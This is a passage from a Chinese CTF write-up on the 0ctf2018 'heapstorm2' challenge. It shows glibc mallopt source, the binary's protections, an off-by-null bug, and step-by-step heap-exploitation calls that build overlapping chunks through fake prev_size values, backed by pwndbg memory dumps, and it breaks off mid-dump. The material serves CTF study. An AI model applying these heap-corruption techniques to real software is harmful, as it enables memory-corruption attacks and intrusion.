class="number">5137</span><span class="keyword">int</span> __libc_mallopt (<span class="keyword">int</span> param_number, <span class="keyword">int</span> value)</span><br><span class="line"><span class="number">5138</span>&#123;</span><br><span class="line"><span class="number">5139</span>  mstate av = &amp;main_arena;</span><br><span class="line"><span class="number">5140</span>  <span class="keyword">int</span> res = <span class="number">1</span>;</span><br><span class="line"><span class="number">5141</span></span><br><span class="line"><span class="number">5142</span>  <span class="keyword">if</span> (__malloc_initialized &lt; <span class="number">0</span>)</span><br><span class="line"><span class="number">5143</span>    ptmalloc_init ();</span><br><span class="line"><span class="number">5144</span>  __libc_lock_lock (av-&gt;mutex);</span><br><span class="line"><span class="number">5145</span></span><br><span class="line"><span class="number">5146</span>  LIBC_PROBE (memory_mallopt, <span class="number">2</span>, param_number, value);</span><br><span class="line"><span class="number">5147</span></span><br><span class="line"><span class="number">5148</span>  <span class="comment">/* We must consolidate main arena before changing max_fast</span></span><br><span class="line"><span class="comment">5149     (see definition of set_max_fast).  */</span></span><br><span class="line"><span class="number">5150</span>  malloc_consolidate (av);</span><br><span class="line"><span class="number">5151</span></span><br><span class="line"><span class="number">5152</span>  <span class="keyword">switch</span> (param_number)</span><br><span class="line"><span class="number">5153</span>    &#123;</span><br><span class="line"><span class="number">5154</span>    <span class="keyword">case</span> M_MXFAST:</span><br><span class="line"><span class="number">5155</span>      <span class="keyword">if</span> (value &gt;= <span class="number">0</span> &amp;&amp; value &lt;= MAX_FAST_SIZE)</span><br><span class="line"><span class="number">5156</span>        &#123;</span><br><span class="line"><span class="number">5157</span>          LIBC_PROBE (memory_mallopt_mxfast, <span class="number">2</span>, value, get_max_fast ());</span><br><span class="line"><span class="number">5158</span>          set_max_fast (value);</span><br><span class="line"><span class="number">5159</span>        &#125;</span><br><span class="line"><span class="number">5160</span>      <span class="keyword">else</span></span><br><span class="line"><span class="number">5161</span>        res = <span class="number">0</span>;</span><br><span class="line"><span class="number">5162</span>      <span class="keyword">break</span>;</span><br><span class="line"><span class="number">5163</span></span><br><span class="line"><span class="number">5164</span>    <span class="keyword">case</span> M_TRIM_THRESHOLD:</span><br><span class="line"><span class="number">5165</span>      do_set_trim_threshold (value);</span><br><span class="line"><span class="number">5166</span>      <span class="keyword">break</span>;</span><br><span class="line"><span class="number">5167</span></span><br><span class="line"><span class="number">5168</span>    <span class="keyword">case</span> M_TOP_PAD:</span><br><span class="line"><span class="number">5169</span>      do_set_top_pad (value);</span><br><span class="line"><span class="number">5170</span>      <span class="keyword">break</span>;</span><br><span class="line"><span class="number">5171</span></span><br><span class="line"><span class="number">5172</span>    <span class="keyword">case</span> M_MMAP_THRESHOLD:</span><br><span class="line"><span class="number">5173</span>      res = do_set_mmap_threshold (value);</span><br><span class="line"><span class="number">5174</span>      <span class="keyword">break</span>;</span><br><span class="line"><span class="number">5175</span></span><br><span class="line"><span class="number">5176</span>    <span class="keyword">case</span> M_MMAP_MAX:</span><br><span class="line"><span class="number">5177</span>      do_set_mmaps_max (value);</span><br><span class="line"><span class="number">5178</span>      <span class="keyword">break</span>;</span><br><span class="line"><span class="number">5179</span></span><br><span class="line"><span class="number">5180</span>    <span class="keyword">case</span> M_CHECK_ACTION:</span><br><span class="line"><span class="number">5181</span>      do_set_mallopt_check (value);</span><br><span class="line"><span class="number">5182</span>      <span class="keyword">break</span>;</span><br><span class="line"><span class="number">5183</span></span><br><span class="line"><span class="number">5184</span>    <span class="keyword">case</span> M_PERTURB:</span><br><span class="line"><span class="number">5185</span>      do_set_perturb_byte (value);</span><br><span class="line"><span class="number">5186</span>      <span class="keyword">break</span>;</span><br><span class="line"><span class="number">5187</span></span><br><span class="line"><span class="number">5188</span>    <span class="keyword">case</span> M_ARENA_TEST:</span><br><span class="line"><span class="number">5189</span>      <span class="keyword">if</span> (value &gt; <span class="number">0</span>)</span><br><span class="line"><span class="number">5190</span>        do_set_arena_test (value);</span><br><span class="line"><span class="number">5191</span>      <span class="keyword">break</span>;</span><br><span class="line"><span class="number">5192</span></span><br><span class="line"><span class="number">5193</span>    <span class="keyword">case</span> M_ARENA_MAX:</span><br><span class="line"><span class="number">5194</span>      <span class="keyword">if</span> (value &gt; <span class="number">0</span>)</span><br><span class="line"><span class="number">5195</span>        do_set_arena_max (value);</span><br><span class="line"><span class="number">5196</span>      <span class="keyword">break</span>;</span><br><span class="line"><span class="number">5197</span>    &#125;</span><br><span class="line"><span class="number">5198</span>  __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line"><span class="number">5199</span>  <span class="keyword">return</span> res;</span><br><span class="line"><span class="number">5200</span>&#125;</span><br></pre></td></tr></table></figure></li><li><p>利用linux的/dev/urandom文件产生较好的随机数<br><a href="https://blog.csdn.net/stpeace/article/details/45829161" target="_blank" rel="noopener">https://blog.csdn.net/stpeace/article/details/45829161</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> randNum = <span class="number">0</span>;  </span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>, O_RDONLY);  </span><br><span class="line"><span class="keyword">if</span>(<span class="number">-1</span> == fd)  </span><br><span class="line">&#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error\n"</span>);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">read(fd, (<span class="keyword">char</span> *)&amp;randNum, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));  </span><br><span class="line">close(fd);</span><br></pre></td></tr></table></figure></li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/ctf/0ctf2018/heapstorm2$ checksec heapstorm2</span><br><span class="line">[*] &apos;/home/parallels/ctf/0ctf2018/heapstorm2/heapstorm2&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><h4 id="关闭fastbin的分配"><a href="#关闭fastbin的分配" class="headerlink" title="关闭fastbin的分配"></a>关闭fastbin的分配</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-153103.png" alt=""></p><h4 id="对存放堆指针和size的地方进行随机化"><a href="#对存放堆指针和size的地方进行随机化" class="headerlink" title="对存放堆指针和size的地方进行随机化"></a>对存放堆指针和size的地方进行随机化</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-130056.png" alt=""><br>读入随机数前<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *555555554000+0x0000000000000CA6</span><br><span class="line">Breakpoint 1 at 0x8159b10f76</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/parallels/ctf/0ctf2018/heapstorm2/heapstorm2 </span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Breakpoint *0x555555554000+0x0000000000000CA6</span><br><span class="line">pwndbg&gt; x /50gx 0x13370800</span><br><span class="line">0x13370800:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370810:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370820:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370830:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370840:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370850:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370860:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370870:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370880:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370890:0x00000000000000000x0000000000000000</span><br><span class="line">0x133708a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x133708b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x133708c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x133708d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x133708e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x133708f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370900:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370910:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370920:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370930:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370940:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370950:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370960:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370970:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370980:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>读入随机数后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /50gx 0x13370800</span><br><span class="line">0x13370800:0x72cec7f9b44fb49e0x438137bc554b405e</span><br><span class="line">0x13370810:0x7a4f542a3248dba20x0000000000000000</span><br><span class="line">0x13370820:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370830:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370840:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370850:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-143829.png" alt=""><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-143005.png" alt=""><br>用如图上数字1处的随机数去覆盖后面的16个的每一行的左八个字节(堆指针)。用如图上数字2处的随机数去覆盖后面的16个的每一行的右八个字节(size)。<br>用图上数字3处的随机数去覆盖数字4处。</p><h4 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-151647.png" alt=""></p><h4 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-151306.png" alt=""></p><h4 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h4><p>有off by null漏洞<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-151326.png" alt=""></p><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-151451.png" alt=""></p><h4 id="显示"><a href="#显示" class="headerlink" title="显示"></a>显示</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-152716.png" alt=""></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在update的时候有一个off by null。</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>之前做堆的题都不建结构体，全靠脑补…这次建一下，让反编译出来的好看一点。<br>1.添加segment<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-134354.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-134532.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-135002.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-135306.png" alt=""><br>2.建结构体<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-142635.png" alt=""><br>3.改函数参数<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-143720.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-143639.png" alt=""><br>4.最后的修改结果<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-151748.png" alt=""></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="shrink-the-chunk来overlap"><a href="#shrink-the-chunk来overlap" class="headerlink" title="shrink the chunk来overlap"></a>shrink the chunk来overlap</h3><p>前提：存在一个off-by-null漏洞（已满足）<br>目的：创造出overlap chunk，进而更改其他chunk中的内容<br>主要利用unsorted,small bin会unlink合并的特性来达到我们的目的。<br>1.伪造prev_size<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">alloc(0x18)     #0</span><br><span class="line">alloc(0x508)    #1</span><br><span class="line">alloc(0x18)     #2</span><br><span class="line">update(1, &apos;h&apos;*0x4f0 + p64(0x500))   #set fake prev_size</span><br><span class="line"></span><br><span class="line">alloc(0x18)     #3</span><br><span class="line">alloc(0x508)    #4</span><br><span class="line">alloc(0x18)     #5</span><br><span class="line">update(4, &apos;h&apos;*0x4f0 + p64(0x500))   #set fake prev_size</span><br><span class="line">alloc(0x18)     #6</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-04-013529.jpg" alt=""><br>2.free 1,于是下一个chunk的inuse和prev_size将被设置。<br>图示灰色的地方代表被free掉，然后触发off by null，修改1的size。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(1)</span><br><span class="line">update(0, &apos;h&apos;*(0x18-12))    #off-by-one</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-04-015946.png" alt=""><br>3.将free的1再分配出来,然后再分配一块空间到原来的1中，注意大小不能刚好使得这个chunk和2相邻，否则会把2的inuse位置1，不能在后续触发unlink。<br>然后再free 2，就能触发unlink，然后1和7，overlap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alloc(0x18)     #1</span><br><span class="line">alloc(0x4d8)    #7</span><br><span class="line">free(1)</span><br><span class="line">free(2)         #backward consolidate</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-04-022306.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-04-023131.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /500gx 0x55f082807020</span><br><span class="line">0x55f082807020:0x49495f4d524f54530x0000000000000021</span><br><span class="line">0x55f082807030:0x00007f685fb20b780x00007f685fb20b78</span><br><span class="line">0x55f082807040:0x00000000000000200x00000000000004e0--&gt;7</span><br><span class="line">0x55f082807050:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807060:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807070:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807080:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807090:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828070a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828070b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828070c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828070d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828070e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828070f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807100:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807110:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807120:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807130:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807140:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807150:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807160:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807170:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807180:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807190:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828071a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828071b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828071c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828071d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828071e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828071f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807200:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807210:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807220:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807230:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807240:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807250:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807260:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807270:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807280:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807290:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828072a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828072b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828072c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828072d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828072e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828072f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807300:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807310:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807320:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807330:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807340:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807350:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807360:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807370:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807380:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807390:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828073a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828073b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828073c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828073d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828073e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828073f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807400:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807410:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807420:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807430:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807440:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807450:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807460:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807470:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807480:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807490:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828074a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828074b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828074c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828074d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828074e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828074f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807500:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807510:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807520:0x00000000000000000x524f545350414549</span><br><span class="line">0x55f082807530:0x00000000000005100x0000000000000020</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-04-025208.jpg" alt=""><br>当free 2的时候，因为2是small bin的大小的缘故，所以会检测上一个chunk是否inused.<br>它会根据prev_size找到1，然后做unlink。<br>此时，unsortbin存放着这块大的chunk，所以下次malloc会用这一块先分配。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-04-030306.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin </span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555757020 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555757020 /* &apos; puUUU&apos; */</span><br><span class="line">pwndbg&gt; x /20gx 0x555555757020</span><br><span class="line">0x555555757020:0x49495f4d524f54530x0000000000000531</span><br><span class="line">0x555555757030:0x00007ffff7dd1b780x00007ffff7dd1b78</span><br><span class="line">0x555555757040:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757050:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757060:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757070:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757080:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757090:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570b0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>可以看出通过chunk shrink,实现了overlap。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alloc(0x38)     #1</span><br><span class="line">alloc(0x4e8)    #2</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">0x555555757020 FASTBIN &#123;</span><br><span class="line">  prev_size = 5280856823766668371, </span><br><span class="line">  size = 65, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x555555757060 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 1265, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x /100gx 0x555555757020</span><br><span class="line">0x555555757020:0x49495f4d524f54530x0000000000000041--&gt;1</span><br><span class="line">0x555555757030:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757040:0x00000000000000000x0000000000000000--&gt;7</span><br><span class="line">0x555555757050:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757060:0x00000000000000000x00000000000004f1--&gt;2</span><br><span class="line">0x555555757070:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757080:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757090:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570c0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>重复一遍之前的过程，再次构造overlap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">free(4)</span><br><span class="line">update(3, &apos;h&apos;*(0x18-12))    #off-by-one</span><br><span class="line">alloc(0x18)     #4</span><br><span class="line">alloc(0x4d8)    #8</span><br><span class="line">free(4)</span><br><span class="line">free(5)         #backward consolidate</span><br><span class="line">alloc(0x48)     #4</span><br></pre></td></tr></table></figure></p><p>然后4和8交叠。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /50gx 0x555555757570</span><br><span class="line">0x555555757570:0x49495f4d524f54530x0000000000000021</span><br><span class="line">0x555555757580:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757590:0x00000000000000000x00000000000004e1--&gt;8</span><br><span class="line">0x5555557575a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557575b0:0x00000000000000000x0000000000000000</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">unlink之后</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">pwndbg&gt; x /50gx 0x555555757570</span><br><span 